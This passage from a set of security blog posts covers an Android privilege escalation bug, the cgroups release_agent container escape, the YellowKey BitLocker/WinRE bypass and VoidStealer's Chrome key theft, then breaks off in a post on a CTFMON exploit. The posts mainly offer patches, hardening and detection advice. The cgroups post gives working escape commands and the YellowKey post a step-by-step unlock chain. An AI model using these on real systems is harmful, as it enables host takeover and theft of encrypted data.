TAGS       : android, cve-2025-48595, privilege-escalation, integer-overflow, spyware, cisa-kev
WORD_COUNT : 1164
EXCERPT    : An integer overflow in the Android Framework, no user interaction, already burned by a targeted attacker before the patch shipped. This is the kind of bug that ends up on someone's phone you have never heard of.
</FRONTMATTER>
<BODY>
Here is what gets me about this one. It is not the CVSS, it is not the patch count, it is the four words Google buried near the bottom of the June bulletin: "limited, targeted exploitation." Anyone who has watched Android advisories for a few years knows what that phrasing means. It is not a researcher who found something cute in a fuzzer. It is somebody's phone, somewhere, already owned, before any of us got a chance to read the CVE number.

The bug is CVE-2025-48595. An integer overflow in the Android Framework, the system layer that sits on every Android device regardless of who built the hardware. CVSS 8.4. Local attack vector, low complexity, low privileges required, and the part that matters most: user interaction none. CISA added it to the Known Exploited Vulnerabilities catalog on June 2, with a federal remediation deadline of June 5. The fix landed in Google's June 2026 Android Security Bulletin, which cleaned up 124 vulnerabilities total, 18 of them rated Critical. This was one of the bigger monthly drops in a while.

## What "Framework integer overflow" actually means here

Google classified it as CWE-190, integer overflow or wraparound. That class of bug is old and boring right up until it sits in a privileged code path, and then it is one of the most dangerous things on the device.

The Framework is the layer that brokers between your sandboxed app and the system. When an app asks for something, a Binder transaction, a parcel, a buffer of some size, the Framework does arithmetic on values the app controls. Sizes, counts, offsets. If one of those calculations runs past the maximum the integer type can hold, it wraps around to a small number. The code then allocates a buffer based on the small wrapped value, but copies in data sized by the original large value. That is your classic overflow-to-corruption pivot.

Google has not published the exact file or commit, which is normal for a bug that is actively exploited. They patch first and talk later, if at all. So I am not going to invent a commit hash to look authoritative. What I can do is show you the shape of the bug, because CWE-190 in a Framework allocation path almost always looks like this:

```java
// ILLUSTRATIVE. Not the real CVE-2025-48595 code, which Google has not disclosed.
// This is the canonical shape of a CWE-190 in a size calculation.

int count = parcel.readInt();        // attacker-controlled
int itemSize = parcel.readInt();     // attacker-controlled

// Multiplication overflows a 32-bit int and wraps to a tiny value.
int totalSize = count * itemSize;    // e.g. 0x10000 * 0x10000 wraps to 0

byte[] buf = new byte[totalSize];    // allocates ~0 bytes

for (int i = 0; i < count; i++) {
    System.arraycopy(item[i], 0, buf, i * itemSize, itemSize); // writes past buf
}
```

When this kind of math happens in a native layer reached through the Framework, JNI, a HAL call, a parcel deserializer, the wrapped allocation lands on a heap that lives in a more privileged process than your app. You corrupt adjacent objects, you groom the heap so the right object sits next to your overflow, and you turn a size miscalculation into control over a pointer or a length field in `system_server` or another privileged service.

## Why no user interaction is the scary part

A lot of Android LPEs need something. A specific app installed, a permission granted, a tap on a dialog. This one needs none of that after the attacker already has code running. Picture the chain. A malicious app gets onto the device, or a browser bug drops a payload, or a preinstalled component is compromised in the supply chain. That gives the attacker the unprivileged foothold. From there CVE-2025-48595 walks them out of the app sandbox and up into system territory without a single prompt firing.

That is exactly the profile commercial spyware wants. The same "limited, targeted" language showed up around the Android zero-days tied to Heliconia, Predator, and Hermit campaigns. These are not crimeware kits spraying ad fraud. They are surveillance tools aimed at specific people. Journalists. Lawyers. Dissidents. The occasional executive. If you are reading this thinking "I am not a target," you are probably right, and that is also exactly why these bugs stay quiet for so long.

## Which devices

Android 14, 15, 16, and 16-QPR2, every patch level before 2026-06-01. Because the flaw is in the Framework and not in some vendor blob, it does not care whose logo is on the back of the phone. Pixel, Samsung, OnePlus, Motorola, Xiaomi, all of them. Work profiles, Knox, MDM-managed fleets, equally exposed. The Framework is the common denominator, so the blast radius is basically the entire supported Android install base.

## Fix status

Patched at security patch levels 2026-06-01 and 2026-06-05. Google pushed the fix to AOSP and to OEMs ahead of the bulletin. The official advisory is the June 2026 Android Security Bulletin at source.android.com/docs/security/bulletin/2026/2026-06-01.

The catch, as always with Android, is delivery. Pixel devices get the update on day one. Samsung typically takes one to four weeks depending on model, region, and carrier. Everyone else is anywhere from days to never. That gap between bulletin publication and actual delivery to a device is the window an attacker lives in, and for non-Pixel hardware it can stay open for weeks after the bug is public.

## What to actually do

Update now if your device offers it. Settings, then About Phone, then check that the Android Security Patch Level reads June 1, 2026 or later. If it does not, your device has not received the fix yet regardless of what the OEM marketing says.

For a managed fleet, push the June patch through Intune, Workspace ONE, or whatever EMM you run, the moment the OEM releases it. Until then, set conditional access so devices below the 2026-06-01 patch level cannot reach email, documents, or internal apps. That is standard mobile threat defense and it costs you nothing but a policy change.

If you actually fit the target profile for this kind of tooling, executive, counsel, journalist, anyone who has reason to think a government cares about their phone, move to a Pixel. The day-one patch cadence is the single biggest practical mitigation against spyware-grade Android zero-days, because it collapses that delivery window down to hours instead of weeks. Turning on Advanced Protection Mode on top of that is worth the minor friction.

And watch for the second wave. Right now exploitation is limited and targeted. The moment full technical details go public, and they usually do once the patch is widely deployed, expect the commodity crowd to reproduce it. The jump from targeted to widespread on Android Framework bugs has historically taken weeks, not months. Patch before that clock runs out.
</BODY>
</DOCUMENT>

--------------------------------------------------------------------------------

<DOCUMENT id="011" type="security-research-post">
<FRONTMATTER>
TITLE      : CVE-2022-0492 Hits KEV: A Four-Year-Old cgroups Bug Is Escaping Containers in the Wild
DATE       : 2026-06-03
URL        : https://garrettstimpson.ca/posts/2026/06/03/cve-2022-0492-cgroups-release-agent-kev/
CVE        : cve-2022-0492, CVE-2022-0492
CATEGORIES : exploits, linux
TAGS       : cve-2022-0492, cgroups, container-escape, release-agent, kubernetes, kev, lpe
WORD_COUNT : 1248
EXCERPT    : CISA added a 2022 cgroups release_agent bug to KEV on June 2. The patch was one if-statement. The reason it took four years to show up on the exploited list is the more interesting part.
</FRONTMATTER>
<BODY>
Here's what gets me about this one. Every Linux root bug I've written up over the last two weeks was new. Copy Fail, Dirty Frag, Fragnesia, CIFSwitch. Fresh CVEs, page-cache write primitives, exploit devs racing the patch authors by hours. Then on June 2, CISA quietly added CVE-2022-0492 to the Known Exploited Vulnerabilities catalog. A bug from February 2022. Patched four years ago. One if-statement.

So why is it on the actively-exploited list now?

Because the bug was never really about the kernel being clever. It was about the kernel forgetting to ask one question. And the environments where that forgotten question matters, multi-tenant Kubernetes and shared container hosts, are exactly the environments that took years to actually lock down. The vulnerability sat in plain sight, the writeups were public, and attackers waited until enough soft targets existed to make it worth weaponizing at scale. That's the story CISA is telling by listing it in 2026.

## The one line that wasn't there

CVE-2022-0492 lives in `cgroup_release_agent_write` in `kernel/cgroup/cgroup-v1.c`. Yiqi Sun and Kevin Wang reported it, Yuval Avrahami at Unit 42 wrote the canonical analysis, and the whole thing comes down to a privileged operation that the kernel exposed to unprivileged callers by mistake.

cgroups v1 has a feature called the release agent. You write a path to the `release_agent` file, and when the last process in a cgroup that has `notify_on_release` set exits, the kernel runs that path. It runs it as a full root process with every capability, in the initial namespaces. That is about as privileged as execution gets on a Linux box. Deciding which binary gets that treatment should obviously require real privilege.

The kernel never checked. Here is the entire fix, commit `24f6008564183aa120d07c03d9289519c2fe02af`, which landed in 5.17-rc3:

```c
@@ -549,6 +549,14 @@ static ssize_t cgroup_release_agent_write(struct kernfs_open_file *of,
+	/*
+	 * Release agent gets called with all capabilities,
+	 * require capabilities to set release agent.
+	 */
+	if ((of->file->f_cred->user_ns != &init_user_ns) ||
+	    !capable(CAP_SYS_ADMIN))
+		return -EPERM;
```

That's it. Require `CAP_SYS_ADMIN` in the initial user namespace before you let someone set the binary that runs as root. Before this patch, the only thing standing between you and the `release_agent` file was normal file permissions, and the file is owned by root. So at first glance this reads like a root-only privilege escalation, which sounds useless. Who needs to escalate from root?

That framing is the trap, and it's why the bug aged the way it did.

## Root inside a container is not root

The modern Linux privilege model has a gray zone between "the root user" and "actually controls the machine." Capabilities, user namespaces, and containers all live in that gray zone. A process can be UID 0 inside a container and still be heavily fenced in by Seccomp, AppArmor, dropped capabilities, and read-only mounts. CVE-2022-0492 is the lever that pops a container-root process out into host-root, and that is a very different thing than escalating on a bare host.

The escape chain is mechanical once you see it. The cgroupfs mounts a container gets are read-only, so you can't write `release_agent` directly. You have to mount your own writable copy. Mounting cgroupfs needs `CAP_SYS_ADMIN`, which your container doesn't have in the init user namespace. So you call `unshare(CLONE_NEWUSER | CLONE_NEWNS)`, create a fresh user namespace where you do hold `CAP_SYS_ADMIN`, and mount a cgroupfs there.

One catch. When you mount inside a cgroup namespace, you get your own cgroup, not the root cgroup, and `release_agent` only exists at the root. So you need to already be sitting in the root cgroup of some subsystem. Docker historically placed containers in the root RDMA cgroup, which is exactly the kind of detail that makes this practical rather than theoretical. From there it's three writes:

```bash
# inside the new user + mount namespace, root cgroup of a subsystem mounted rw
mkdir -p /tmp/cg && mount -t cgroup -o rdma cgroup /tmp/cg
mkdir /tmp/cg/x
echo 1 > /tmp/cg/x/notify_on_release

# point release_agent at a payload on the host filesystem
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host/exploit" > /tmp/cg/release_agent

# the payload that runs as real root on the host
printf '#!/bin/sh\nps aux > %s/output\n' "$host" > /exploit
chmod +x /exploit

# trigger: put a process in the child cgroup and let it exit
sh -c "echo \$\$ > /tmp/cg/x/cgroup.procs"
```

When that short-lived process dies, the kernel walks the release path and executes `/exploit` as root in the host's initial namespaces. No memory corruption. No race window you have to win. The whole thing is the kernel doing precisely what it was told, because nobody told it to check who was doing the telling.

## Who actually gets popped

The good news, and the reason this didn't burn the world down in 2022, is that defense in depth genuinely stops it. A container escapes only if all of the following are true at once. It runs as root or without `no_new_privs`. It runs without AppArmor and without SELinux, because both block the mount. It runs without Seccomp, because Seccomp blocks `unshare`. The host has unprivileged user namespaces enabled. And the container sits in a root v1 cgroup.

Stack any one of Seccomp, AppArmor, or SELinux and the chain breaks. That's why this was a non-event for anyone following container hardening best practice. The trouble is how many shared runners, legacy clusters, and "we'll fix the security context later" deployments never got there. Four years is enough time for attackers to map out where those soft hosts cluster, and a KEV listing in 2026 says someone finished that mapping.

## What to actually do

Patch the kernel. Anything 5.17 or newer has the fix, and every maintained distro backported it long ago, so if you're current you are not vulnerable to the bug itself. The KEV listing is really a prompt to go find the hosts that aren't current and the containers running with the security context stripped off.

If you can't patch immediately, the mitigation is the same hardening that already neutralizes the exploit. Make sure your workloads run with Seccomp on, and with either AppArmor or SELinux enforcing. In Kubernetes that means a `securityContext` with `seccompProfile` set to `RuntimeDefault` and `allowPrivilegeEscalation: false`, and not handing containers `CAP_SYS_ADMIN`. If you genuinely don't need user namespaces inside containers, you can shut the door at the host level:

```bash
echo "user.max_user_namespaces=0" > /etc/sysctl.d/cve-2022-0492.conf
sysctl --system
```

That breaks rootless containers, Flatpak, and sandboxed browsers, so test it before you roll it out broadly. Detection-wise, the loud signal is `unshare` with `CLONE_NEWUSER` from a workload that has no business creating namespaces, immediately followed by a cgroupfs mount and a write to `release_agent`. Falco, Tetragon, or any eBPF-based runtime tool can flag that sequence cleanly. Palo Alto published a checker image at `github.com/PaloAltoNetworks/can-ctr-escape-cve-2022-0492` if you want to confirm whether a given container config can actually pull off the escape.

The lesson I keep coming back to is that "root-only" and "container-only" CVEs don't age out of relevance. They wait for the deployment reality to catch up to them. This one waited four years, and the wait is over.
</BODY>
</DOCUMENT>

--------------------------------------------------------------------------------

<DOCUMENT id="012" type="security-research-post">
<FRONTMATTER>
TITLE      : YellowKey (CVE-2026-45585): A USB Stick, WinRE, and Your BitLocker Key Just Walks Out The Door
DATE       : 2026-06-02
URL        : https://garrettstimpson.ca/posts/2026/06/02/yellowkey-cve-2026-45585-bitlocker-winre-txf-bypass/
CVE        : CVE-2026-45585, cve-2026-45585
CATEGORIES : exploits, windows
TAGS       : cve-2026-45585, bitlocker, winre, transactional-ntfs, physical-access
WORD_COUNT : 1166
EXCERPT    : A crafted FsTx directory on a USB drive makes Windows Recovery Environment delete winpeshl.ini on a different volume, dropping you to cmd.exe with the BitLocker volume already unlocked. TPM-only or TPM plus PIN, it does not matter.
</FRONTMATTER>
<BODY>
Here is what gets me about YellowKey. We have spent years telling people that BitLocker plus a TPM is good enough for a laptop, that the encryption key never leaves the chip, that an attacker who grabs your machine at a coffee shop gets a brick. And then a researcher who signs their work "Chaotic Eclipse" drops a proof of concept that says: plug in this USB stick, reboot, hold CTRL, and you are sitting at a command prompt looking at the decrypted C: drive. No PIN prompt. No password. The TPM happily handed the key over because from its point of view nothing was wrong.

CVE-2026-45585. CVSS 6.8, which feels low until you remember that the "physical access required" caveat is exactly the threat model BitLocker exists to defend against. A stolen laptop. A border crossing. An evil maid with ten minutes and a hotel keycard. That is the whole point of full disk encryption, and this bug walks right through it.

## The part of WinRE nobody documented

The vulnerable code lives in the Windows Recovery Environment. WinRE is the little WinPE-based rescue OS that boots when your machine cannot, the thing that shows you "Automatic Repair" and the reset options. It runs from a separate image, usually `X:`, while your real Windows install sits on `C:`. And critically, by the time WinRE is running, the BitLocker volume has already been unlocked, because WinRE needs to read and repair it.

During WinRE startup, a utility called `autofstx.exe` runs. It is registered in the Session Manager `BootExecute` value, so it fires automatically before anything interactive happens. Its job is to replay Transactional NTFS metadata, the journaling layer NTFS uses so that a half-finished file operation can be rolled back or completed cleanly after a crash. That metadata lives in a hidden directory called `\System Volume Information\FsTx` on each volume.

Nobody wrote this down anywhere. The FsTx replay path inside WinRE does not appear in Microsoft docs, it is not in the usual NTFS internals references, and as far as I can tell no public security research had touched it before this. It was just sitting there, running as the most privileged thing on the machine at the most sensitive moment of boot.

## Crossing the volume boundary

The trick, and the reason Will Dormann called this the real story when he reproduced it, is that the transaction replay does not stay on its own volume. You craft FsTx metadata on a USB drive. You boot into WinRE. `autofstx.exe` reads the transaction log off the attacker volume and replays it. And the replayed transaction reaches across and modifies a file on `X:`.

The file it deletes is `X:\Windows\System32\winpeshl.ini`. That file tells WinRE what shell to launch. Remove it, and WinRE falls back to the oldest behavior it knows: spawn `cmd.exe`. So instead of the recovery menu you get a SYSTEM command prompt inside the recovery environment, with the real BitLocker-protected volume mounted and decrypted right there. From the encryption's perspective everything is legitimate. WinRE is trusted, WinRE asked for the key, the TPM sealed measurements matched, the volume unlocked. The fact that a USB stick rewrote the recovery shell out from under it never enters the calculation.

A rough sketch of the chain:

```
1. Prepare a USB volume with crafted \System Volume Information\FsTx metadata
   (a TxF transaction whose target resolves to X:\Windows\System32\winpeshl.ini)
2. Plug it into the locked, powered-off target. BitLocker on, TPM-only.
3. Boot into WinRE (Shift+Restart, or interrupt boot twice, or the EFI path).
4. autofstx.exe runs from BootExecute, replays the transaction log,
   deletes winpeshl.ini on X:.
5. With no shell config, WinRE drops to cmd.exe as SYSTEM.
6. The OS volume is already unlocked. Hold CTRL during the transition to
   keep the prompt. Read, copy, or backdoor C: at will.
```

That CTRL-hold detail is what the researcher described as making the whole thing feel like a backdoor rather than a bug. And here is the line that should bother you most: TPM plus PIN does not save you. The researcher tested it. The PIN gates the normal boot path, but the WinRE path and its FsTx replay happen inside the trusted boundary, so the extra factor never gets a chance to matter.

## Why this one is different

Most BitLocker bypasses I have read are downgrade attacks or sniffing attacks. Intrinsec's recent BitUnlocker work, for instance, abuses a signed-but-old `bootmgfw.efi` and the fact that Secure Boot checks the certificate and not the version. TPM bus sniffing physically taps the LPC or SPI lines to grab the key in transit. Those are real, but they need either a vulnerable signed binary still trusted by Secure Boot or a logic analyzer and steady hands.

YellowKey needs a USB stick and the ability to reboot. That is it. No soldering, no oscilloscope, no hunting for an unrevoked old boot manager. It is a logic flaw in undocumented recovery code, deterministic, and it works on a default Windows 11 consumer install because Windows 11 turns on BitLocker in TPM-only mode out of the box. Most people with an encrypted Windows 11 laptop have no idea they are running exactly the configuration this targets.

## What to actually do

Microsoft has not shipped a real code fix as of this writing. What they pushed is a mitigation, and you can apply the same thing yourself right now. The fix is to stop `autofstx.exe` from running automatically during WinRE boot by pulling it out of the `BootExecute` list in the recovery image. From an elevated prompt you can mount the WinRE image and edit the Session Manager key so the `autofstx.exe` entry is gone from the `BootExecute` `REG_MULTI_SZ`. No `autofstx.exe`, no transaction replay, no `winpeshl.ini` deletion, no shell.

Beyond that, the durable answer is the one BitLocker always had for physical-access threats and that people keep skipping because it is mildly annoying: set a pre-boot PIN, yes, but more importantly disable the boot-to-WinRE paths an attacker can reach without authenticating, and treat the recovery environment as part of your attack surface rather than a safety net. If you manage a fleet, audit your WinRE images and confirm the mitigation actually landed in them, because a reimaged or older recovery partition will happily reintroduce the vulnerable `autofstx.exe`. And for the genuinely sensitive machines, TPM plus PIN with WinRE disabled entirely is the configuration that closes this, since the bug lives in the recovery environment you just removed.

The thing I keep coming back to is how long this sat there. A whole privileged code path in the recovery environment, replaying transactions across volume boundaries, and it took someone with a grudge against Microsoft's disclosure process to go look at it. Makes you wonder what else is in WinRE that nobody has read.
</BODY>
</DOCUMENT>

--------------------------------------------------------------------------------

<DOCUMENT id="013" type="security-research-post">
<FRONTMATTER>
TITLE      : VoidStealer's Debugger Trick: Stealing Chrome's App-Bound Key With a Hardware Breakpoint and Zero Injection
DATE       : 2026-06-02
URL        : https://garrettstimpson.ca/posts/2026/06/02/voidstealer-debugger-abe-bypass/
CVE        : none
CATEGORIES : malware, analysis
TAGS       : VoidStealer, ABE-bypass, infostealer, hardware-breakpoint, debugger, chrome, mitre-attack, windows
WORD_COUNT : 1733
EXCERPT    : VoidStealer v2.0 is the first infostealer caught in the wild ripping Chrome's App-Bound Encryption key out of memory with a debugger and a hardware breakpoint, no process injection and no SYSTEM privileges required.
</FRONTMATTER>
<BODY>
Most stealers that beat Chrome's App-Bound Encryption do it the loud way. They inject into the browser, call the elevation service from inside its address space, and hope nothing is watching the write. VoidStealer v2.0 does something quieter, and that is what makes it worth a writeup. It attaches to Chrome as a debugger, drops a hardware breakpoint on the exact instruction where the master key sits in plaintext, and reads the key out with two `ReadProcessMemory` calls. No injection. No write into the browser at all. No SYSTEM token. I'll be honest, the first time I read the chain I muttered something unkind, because it is clever.

## What showed up

VoidStealer is a Malware-as-a-Service infostealer that started selling on HackForums and a few darkweb boards around December 12, 2025. It is mid-tier commodity in most respects, a subscription stealer any affiliate can buy and point at victims through fake software pages and bogus company portals. What pushed it onto my radar is the v2.0 release on March 13, 2026, which added a debugger-based App-Bound Encryption bypass. Gen Threat Labs published the dissection on March 19 and SOCRadar followed in April with the operational picture. The v2.0 sample they analyzed carries SHA256 `f783fde5cf7930e4b3054393efadd3675b505cbef8e9d7ae58aa35b435adeea4`. That hash is your reference point if you want to pull metadata, not a download link, and nothing here required touching the binary.

For the data side, VoidStealer is the usual grab-and-go. Chromium credentials and session cookies, crypto wallets from Exodus, Atomic, Electrum, MetaMask, and Phantom, Telegram session files, Discord tokens, FTP creds, and a system fingerprint. Cookies are the prize. A live session cookie walks past MFA, which is exactly why Google built ABE to protect them, and exactly why the v2.0 bypass matters.

## What makes it work

Quick recap on what ABE actually defends, because the bypass only makes sense against it. Chrome encrypts cookies and passwords with a per-application key, the `v20_master_key`. That key is stored encrypted on disk in `Local State` under `os_crypt.app_bound_encrypted_key`, and it is wrapped by `CryptProtectData` running as `NT AUTHORITY\SYSTEM`. Chrome itself runs as you, not as SYSTEM, so it cannot unwrap the key directly. A separate Google Chrome Elevation Service runs as SYSTEM, validates that the caller is really Chrome over a COM interface, and hands back the decrypted key. That validation is the soft spot a lot of bypasses lean on, but VoidStealer's new trick does not even bother with the service.

Here is the weakness it goes after instead. However briefly Chrome holds the key, there is a window where `v20_master_key` exists in the browser's memory in cleartext. Chrome tries to shrink that window, keeping the key wrapped with `CryptProtectMemory` under the `CRYPTPROTECTMEMORY_SAME_PROCESS` flag so that even a memory read returns ciphertext unless you call the matching unwrap from inside Chrome. But during startup, when the browser loads its ABE-protected cookies, the key has to be live and plaintext for a moment. VoidStealer engineers itself to be sitting on that moment.

The chain runs like this. VoidStealer spawns the browser with `CreateProcessW` using `CREATE_SUSPENDED` and `SW_HIDE`, resumes the main thread, then attaches as a debugger with `DebugActiveProcess` and enters a `WaitForDebugEvent` loop. Because it attached before the DLLs finished loading, it waits for `LOAD_DLL_DEBUG_EVENT` and watches for `chrome.dll` or `msedge.dll`. Once the target module loads, it scans the `.rdata` section with `ReadProcessMemory` for the string `OSCrypt.AppBoundProvider.Decrypt.ResultCode`. That string is not random. In the Chromium source it sits immediately after the call to `os_crypt::DecryptAppBoundString`, which is precisely where the plaintext key lives, and it has exactly one cross-reference. Perfect landmark.

Finding the string is only half of it. VoidStealer then sweeps the `.text` section for the byte pattern `48 8D 0D`, which is `LEA RCX, [rip+disp32]`, pulls the four-byte displacement, and computes the target with `RCX = (instruction_address + 7) + (signed int32) disp32`. When the resolved address matches the string's address, it has found the instruction that references the result code, and that instruction's address becomes the breakpoint target. Smart, because it survives recompiles and ASLR. No hardcoded offsets to break on the next Chrome update.

Then it arms a hardware breakpoint. It resolves `NtGetNextThread` from `ntdll`, walks every browser thread, suspends each, writes the target into debug register `DR0`, enables it through `DR7`, and resumes. It handles `CREATE_THREAD_DEBUG_EVENT` too, so new threads get the breakpoint as well. Hardware breakpoints are the whole point of the stealth story. A software breakpoint means patching a `0xCC` into the browser, which is a memory write somebody can catch. Debug registers go in through `SetThreadContext` and never modify a byte of the browser's image. When the breakpoint fires during startup, in current builds `R15` for Chrome (or `R14` for Edge) holds a pointer to the key, and two `ReadProcessMemory` calls later the operator has the `v20_master_key`. With that one key, every ABE-protected value Chrome holds decrypts offline.

Worth saying plainly, the VoidStealer crew did not invent any of this. They lifted it from Meckazin's open-source ElevationKatz, public for over half a year. That is the part that should bother defenders, because if a commodity MaaS shop can copy-paste a PoC into a shipping build, everyone else will too.

The rest of the operation is commodity but tidy. The C2 address is not hardcoded. VoidStealer reads it from the display name of an operator-controlled Steam profile, a classic dead drop resolver, so blocking a domain does nothing because the next run pulls the rotated address. SOCRadar tied SteamID `76561199877608270` and the intermediate domain `citrusshop.icu` to live campaigns. Stolen data goes out as chunked JSON, and operators get both a panel and a real-time Telegram ping per victim. On the evasion side, VoidStealer resolves its syscalls dynamically from `ntdll` to dodge userland EDR hooks, keeps its imports out of the table to starve static scanners, XOR-encrypts its config, and bails if its sandbox mutex already exists. On MITRE that maps cleanly to T1555.003 and T1539 for the browser credential and cookie theft, T1027.007 for dynamic API resolution, T1497 for the mutex sandbox check, T1102.001 for the Steam dead drop resolver, and T1041 for the exfil.

## Local educational sample

Below is a safe demonstration of the two interesting primitives, the RIP-relative `LEA` address resolution and the debug-register mechanics. It does not touch a browser, read another process, or recover any key. It resolves a `LEA` displacement from a static byte buffer and arms a hardware breakpoint on the calling thread's own benign function pointer.

```c
// EDUCATIONAL SAMPLE - demonstrates RIP-relative LEA resolution and DR0/DR7 hardware breakpoints
// This does NOT contain any malicious payload, reads no other process, and recovers no keys
// For research and defensive awareness only
#include <windows.h>
#include <stdio.h>
#include <stdint.h>

// Resolve the target of a `LEA RCX, [rip+disp32]` instruction (opcode 48 8D 0D).
// This is pure static math, the same trick VoidStealer uses to find a landmark
// instruction without any hardcoded offset. CPU rule: RCX = (addr + 7) + disp32.
uintptr_t resolve_lea_target(const uint8_t *code, uintptr_t instr_va) {
    if (!(code[0] == 0x48 && code[1] == 0x8D && code[2] == 0x0D))
        return 0; // not the LEA RCX form we are looking for
    int32_t disp32;
    memcpy(&disp32, code + 3, sizeof(disp32)); // next 4 bytes are the signed displacement
    return instr_va + 7 + (intptr_t)disp32;    // 7 = length of this LEA encoding
}

// Arm a hardware breakpoint on the CALLING thread only. No other process is involved.
// DR0 holds the address, DR7 bit 0 (L0) enables it as an execute breakpoint.
void arm_local_hw_breakpoint(void *benign_target) {
    CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    HANDLE th = GetCurrentThread();
    GetThreadContext(th, &ctx);
    ctx.Dr0 = (DWORD_PTR)benign_target; // address to watch
    ctx.Dr7 |= 0x1;                     // L0 = local enable for DR0
    SetThreadContext(th, &ctx);         // note: no write into any image, registers only
    printf("[edu] DR0 set to %p, DR7 L0 enabled (local thread only)\n", benign_target);
}

int main(void) {
    // 48 8D 0D 10 00 00 00 => LEA RCX, [rip+0x10], at pretend VA 0x1000
    uint8_t demo[] = { 0x48, 0x8D, 0x0D, 0x10, 0x00, 0x00, 0x00 };
    printf("[edu] resolved LEA target = 0x%llx\n",
           (unsigned long long)resolve_lea_target(demo, 0x1000)); // expect 0x1017
    arm_local_hw_breakpoint((void *)&main);
    return 0;
}
```

The teaching point is that neither primitive is malicious on its own. A debugger, a `LEA` parse, and a debug register are ordinary tools. The malice is entirely in the target: a browser you spawned hidden, so you could read a key out of it during the one second it was exposed.

## Detection and defense

The good news, per Gen Threat Labs, is that the invariants are hard to hide. Something has to attach a debugger to a browser, set a hardware breakpoint, and read browser memory. Legitimate software does not autonomously debug Chrome. In Sysmon terms, watch Event ID 10 (ProcessAccess) for a non-developer process opening `chrome.exe` or `msedge.exe` with `GrantedAccess` masks that include debug or `PROCESS_VM_READ` rights, and watch Event ID 1 (ProcessCreate) for a browser spawned by an odd parent with `--no-sandbox`, `--disable-extensions`, or the giveaway off-screen `--window-position=-32000,-32000`. A browser launched suspended, headless, on a hidden desktop, or off-screen is the tell that someone wants it running where you cannot see it. On the network side, flag outbound connections to `steamcommunity.com` from endpoints that have no business gaming, and chunked JSON uploads to freshly registered low-reputation domains.

For mitigations, EDR that monitors `SetThreadContext` and cross-process memory reads against browser targets catches this where signatures will not, since the binary changes per affiliate but the behavior does not. Keep the SOCRadar indicators handy, `citrusshop.icu` and SteamID `76561199877608270`, but treat them as perishable because the operators rotate Steam profiles constantly. And the unglamorous control still wins: a stolen cookie only matters until the session dies, so shorter session lifetimes and binding sessions to device posture blunt the whole point of stealing them.

VoidStealer is commodity malware that borrowed an elegant idea. The idea is the threat, not the family, because ElevationKatz is public and the next ten stealers will ship the same chain. Hunt the behavior, not the build.

*Sources: Gen Threat Labs, "VoidStealer: Debugging Chrome to Steal Its Secrets" (Mar 19, 2026); SOCRadar, "Void Stealer: The Infostealer Malware Quietly Targeting Organizations in 2026" (Apr 16, 2026).*
</BODY>
</DOCUMENT>

--------------------------------------------------------------------------------

<DOCUMENT id="014" type="security-research-post">
<FRONTMATTER>
TITLE      : GreenPlasma: a SYSTEM shell hiding inside CTFMON, and the half a PoC that ships it
DATE       : 2026-06-02
URL        : https://garrettstimpson.ca/posts/2026/06/02/greenplasma-ctfmon-section-object-windows-lpe/
CVE        : CVE-2026-33825, CVE-2026-45585
CATEGORIES : exploits, windows
TAGS       : greenplasma, ctfmon, lpe, windows, section-objects, nightmare-eclipse
WORD_COUNT : 1240
EXCERPT    : An unprivileged user plants a section object where CTFMON trusts it, and the SYSTEM text-input service walks itself into your payload. The PoC stops one step short on purpose.
</FRONTMATTER>
<BODY>
Here's the part that gets me about GreenPlasma. There is no kernel bug. No heap groom, no use-after-free, no race against a one-shot window you have to win on the first try. The whole thing is a standard user politely asking the object manager for a section, putting it somewhere a SYSTEM process already looks, and waiting. Windows does the rest to itself.

GreenPlasma is one of two zero-days that Nightmare-Eclipse (the same person posting as Chaotic Eclipse) dropped on GitHub on May 13, 2026, alongside YellowKey, the BitLocker/WinRE bypass I wrote up the other day as CVE-2026-45585. GreenPlasma is the local privilege escalation half. As of June 2 there is still no CVE assigned and no patch from Microsoft. It affects Windows 10, Windows 11, and Windows Server wherever an interactive session is running ctfmon.exe, which in practice is almost everywhere a human logs in.

## What CTFMON actually is, and why it's a problem

ctfmon.exe is the Collaborative Translation Framework monitor. It's the plumbing behind the Text Services Framework: alternate keyboard layouts, IMEs, handwriting, the on-screen keyboard, speech input. Boring, ancient, and on by default. The thing nobody thinks about is that in an interactive logon it runs as SYSTEM, and it brokers shared state through named kernel objects so that per-user input components and the privileged service can talk to each other.

Shared state plus a privilege boundary is the oldest trap in Windows local exploitation. CTFMON reaches into the object manager namespace to find and map section objects (shared memory, created through NtCreateSection and friends) that the input stack uses to pass data around. The trust assumption baked in is that whatever lives at the expected name was placed there by something at least as privileged as CTFMON. That assumption is wrong, and GreenPlasma is the proof.

## The primitive

What James Ballantyne's team at SpiderLabs documented, and what the public PoC demonstrates, is arbitrary section creation in a namespace location a standard user has no business writing to. The exploit, running as a plain unprivileged user, creates a named section object and gets it to land where CTFMON expects a trusted one. Then a chain of registry edits and ACL boundary abuse nudges CTFMON into opening and mapping the attacker's section instead of the legitimate one.

Once SYSTEM maps your section, you own a region of memory that a SYSTEM process treats as its own. You write the bytes. CTFMON reads them back believing they came from the input subsystem. That's the whole ballgame: shellcode or a fake DLL mapping sitting in a region the OS fully trusts, executed in SYSTEM context, with no UAC prompt and no admin rights anywhere in the path.

If you've done Windows privesc work, you know the shape of this. It's a planting-and-trust problem, cousin to the classic DLL search-order and named-pipe impersonation tricks, except the trusted resource here is a section object in the object manager namespace rather than a file on disk. File integrity monitoring will not see it. The on-disk ctfmon.exe never changes. AIDE, Tripwire, anything hashing binaries, all blind. The malicious artifact is a memory section that exists only at runtime.

## The half a PoC

This is the genuinely annoying bit, and also the clever bit. Nightmare-Eclipse shipped the section-creation primitive and then stopped. The final stage, the part that converts "I control a section CTFMON maps" into "I have a SYSTEM shell," is missing. He left a note framing it as a capture-the-flag: if you're smart enough, you can turn this into a full privilege escalation because you can influence the newly created section to manipulate data.

Do not let the word "partial" lull anyone. Releasing the hard, novel part (the boundary abuse that gets your section trusted) while withholding the mechanical last step is not a mitigation. It's a speed bump for skids and a free starting block for anyone competent. The conceptual gap between a controlled SYSTEM-mapped section and code execution is small. You're picking how CTFMON interprets data it already trusts. A skilled person closes that in an afternoon, and ransomware crews and APT operators have repeatedly folded public LPE code into live intrusions inside the same week a drop lands.

